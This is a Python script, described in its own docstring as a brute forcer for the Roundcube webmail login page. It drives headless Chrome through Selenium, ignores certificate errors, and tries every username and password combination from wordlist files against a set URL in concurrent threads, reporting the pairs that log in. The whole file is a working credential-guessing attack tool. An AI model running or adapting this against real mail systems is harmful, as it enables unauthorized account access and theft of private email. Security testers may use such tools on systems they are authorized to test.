'''
This script was written for the purpose of brute forcing the Roundcube email service login page.
'''


import threading
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from webdriver_manager.chrome import ChromeDriverManager
import time

# Replace these with your actual URL
url = 'http://192.168.117.129/roundcubemail/' # Change This

# Paths to the username and password files
username_file_path = 'users.txt' # Change This
password_file_path = 'pass.txt' # Change This

# Read usernames and passwords from the files
with open(username_file_path, 'r') as file:
    username_list = file.read().splitlines()

with open(password_file_path, 'r') as file:
    password_list = file.read().splitlines()

# Function to attempt login with a username and password
def attempt_login(username, password, headless=False):
    # Set up the Chrome driver with options to ignore SSL certificate errors
    service = Service(ChromeDriverManager().install())
    options = webdriver.ChromeOptions()
    options.add_argument('--ignore-certificate-errors')
    options.set_capability('acceptInsecureCerts', True)
    if headless:
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
    driver = webdriver.Chrome(service=service, options=options)

    try:
        # Open the login page
        driver.get(url)
        
        # Wait for the username field to be present
        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.NAME, '_user'))
        )
        
        # Locate and fill in the username field
        username_field = driver.find_element(By.NAME, '_user')
        username_field.send_keys(username)
        
        # Locate and fill in the password field
        password_field = driver.find_element(By.NAME, '_pass')
        password_field.send_keys(password)
        
        # Locate and click the login button
        login_button = driver.find_element(By.ID, 'rcmloginsubmit')
        login_button.click()
        
        try:
            # Wait for the inbox element to be present to confirm login
            WebDriverWait(driver, 2).until(
                EC.presence_of_element_located((By.ID, 'mailboxlist'))
            )
            print(f"Login successful with username: {username} and password: {password}")
        except:
            if check_for_error_message(driver):
                print(f"Login failed with username: {username} and password: {password} error_message: {error_message}")
            else:
                print(f"Login failed with username: {username} and password: {password} (no specific error message found)")
    except Exception as e:
        print(f"Error with username {username} and password {password}: {e}")
    finally:
        # Close the browser
        driver.quit()

# Function to check for error messages indicating a failed login
def check_for_error_message(driver):
    try:
        # Adjust this to match the actual locator of the error message on the login page
        error_message = driver.find_element(By.XPATH, "//div[contains(@class, 'alert-warning')]//span[text()='Login failed.']")
        if error_message.is_displayed():
            #print(f"Error message: {error_message.text}")
            return True
    except:
        return False 

# Main function to handle arguments and start the login attempts
def main():
    parser = argparse.ArgumentParser(description="Login attempt script with optional headless mode.")
    parser.add_argument('--headless', action='store_true', help="Run browser in headless mode.")
    args = parser.parse_args()
    
    # Create and start threads for each combination of username and password
    threads = []
    for username in username_list:
        for password in password_list:
            thread = threading.Thread(target=attempt_login, args=(username, password, args.headless))
            threads.append(thread)
            thread.start()
            # Limit the number of concurrent threads
            if len(threads) >= 10:
                for thread in threads:
                    thread.join()
                threads = []

    # Wait for all remaining threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
